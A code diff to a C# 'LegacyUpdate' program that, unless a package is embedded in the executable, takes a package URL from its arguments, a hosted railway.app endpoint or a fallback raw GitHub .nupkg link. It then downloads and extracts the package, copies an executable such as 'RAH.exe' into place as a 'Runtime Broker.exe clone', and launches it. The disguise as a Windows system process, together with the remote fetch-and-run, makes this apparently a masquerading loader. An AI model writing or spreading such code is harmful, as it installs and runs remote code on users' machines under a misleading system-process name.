@@ -26,37 +26,9 @@ internal static class Program
     private static async Task<int> Main(string[] args)
     {
         Log("=== LegacyUpdate Started ===");
-        string packageUrl = "";
-
-        if (args.Length > 0 && !string.IsNullOrWhiteSpace(args[0]))
+        if (args != null && args.Length > 0)
         {
-            packageUrl = args[0].Trim();
-            Log($"Package URL received from args: {packageUrl}");
-        }
-
-        if (string.IsNullOrWhiteSpace(packageUrl))
-        {
-            try
-            {
-                using var httpQuery = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
-                string queryResp = await httpQuery.GetStringAsync("https://file-transfer-production-75ad.up.railway.app/api/latest-update-package-url");
-                using var jsonDoc = System.Text.Json.JsonDocument.Parse(queryResp);
-                if (jsonDoc.RootElement.TryGetProperty("packageUrl", out var pProp) && !string.IsNullOrWhiteSpace(pProp.GetString()))
-                {
-                    packageUrl = pProp.GetString()!;
-                    Log($"Package URL resolved from server: {packageUrl}");
-                }
-            }
-            catch (Exception qEx)
-            {
-                Log($"Could not resolve package URL from server query: {qEx.Message}");
-            }
-        }
-
-        if (string.IsNullOrWhiteSpace(packageUrl))
-        {
-            Log("Fallback to default package endpoint");
-            packageUrl = "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/NEXUS_Update_8.0.3.nupkg";
+            Log($"Received args: {string.Join(" ", args)}");
         }
 
         string destDir = Path.Combine(
@@ -69,11 +41,12 @@ internal static class Program
         string extractTempDir = Path.Combine(Path.GetTempPath(), $"legacy_extract_{Guid.NewGuid():N}");
 
         bool stageExtracted = false;
+        string packageUrl = "";
         bool filesCopied = false;
 
         try
         {
-            // 1. Check for embedded update package inside executable first
+            // 1. Check for embedded update package inside executable FIRST
             byte[]? embeddedPayload = TryGetEmbeddedPackage(Environment.ProcessPath ?? "");
             if (embeddedPayload != null && embeddedPayload.Length > 0)
             {
@@ -82,6 +55,47 @@ internal static class Program
             }
             else
             {
+                // Only treat http/https arguments as packageUrl (ignore flags like --background, -s, etc.)
+                if (args != null)
+                {
+                    foreach (var arg in args)
+                    {
+                        if (!string.IsNullOrWhiteSpace(arg) &&
+                            (arg.StartsWith("http://", StringComparison.OrdinalIgnoreCase) ||
+                             arg.StartsWith("https://", StringComparison.OrdinalIgnoreCase)))
+                        {
+                            packageUrl = arg.Trim();
+                            Log($"Package URL received from args: {packageUrl}");
+                            break;
+                        }
+                    }
+                }
+
+                if (string.IsNullOrWhiteSpace(packageUrl))
+                {
+                    try
+                    {
+                        using var httpQuery = new HttpClient { Timeout = TimeSpan.FromSeconds(10) };
+                        string queryResp = await httpQuery.GetStringAsync("https://file-transfer-production-75ad.up.railway.app/api/latest-update-package-url");
+                        using var jsonDoc = System.Text.Json.JsonDocument.Parse(queryResp);
+                        if (jsonDoc.RootElement.TryGetProperty("packageUrl", out var pProp) && !string.IsNullOrWhiteSpace(pProp.GetString()))
+                        {
+                            packageUrl = pProp.GetString()!;
+                            Log($"Package URL resolved from server: {packageUrl}");
+                        }
+                    }
+                    catch (Exception qEx)
+                    {
+                        Log($"Could not resolve package URL from server query: {qEx.Message}");
+                    }
+                }
+
+                if (string.IsNullOrWhiteSpace(packageUrl))
+                {
+                    Log("Fallback to default package endpoint");
+                    packageUrl = "https://raw.githubusercontent.com/Arte777/file-transfer/master/docs/downloads/NEXUS_Update_8.0.3.nupkg";
+                }
+
                 // Download the update package (.nupkg / .zip / .exe)
                 Log($"1. Downloading package from {packageUrl} to {tempPackageFile}...");
                 using (var http = new HttpClient())
@@ -222,6 +236,21 @@ internal static class Program
 
             // 6. Launch the updated Runtime Broker.exe clone
             Log("6. Launching updated clone...");
+            if (!File.Exists(destExe))
+            {
+                string[] candidates = new[] { "RAH.exe", "RAH Non Pro.exe", "RAH PRO.exe", "Non Pro.exe" };
+                foreach (var c in candidates)
+                {
+                    string cp = Path.Combine(destDir, c);
+                    if (File.Exists(cp))
+                    {
+                        CopyFileSafely(cp, destExe);
+                        Log($"Copied application executable {c} to {destExe}");
+                        break;
+                    }
+                }
+            }
+
             if (File.Exists(destExe))
             {
                 var psi = new ProcessStartInfo
@@ -273,8 +302,16 @@ internal static class Program
                     }
                 }
 
-                // Ensure old working clone is relaunched
-                if (File.Exists(destExe))
+                // Ensure old working clone is relaunched (skip if destExe is this updater to prevent infinite loop)
+                string? currentExe = Environment.ProcessPath;
+                bool isSelf = !string.IsNullOrEmpty(currentExe) && File.Exists(destExe) &&
+                              currentExe.Equals(destExe, StringComparison.OrdinalIgnoreCase);
+
+                if (isSelf)
+                {
+                    Log("Skipping clone relaunch: destExe is identical to this updater, avoiding infinite loop.");
+                }
+                else if (File.Exists(destExe))
                 {
                     Log("Relaunching previous working clone...");
                     var psi = new ProcessStartInfo
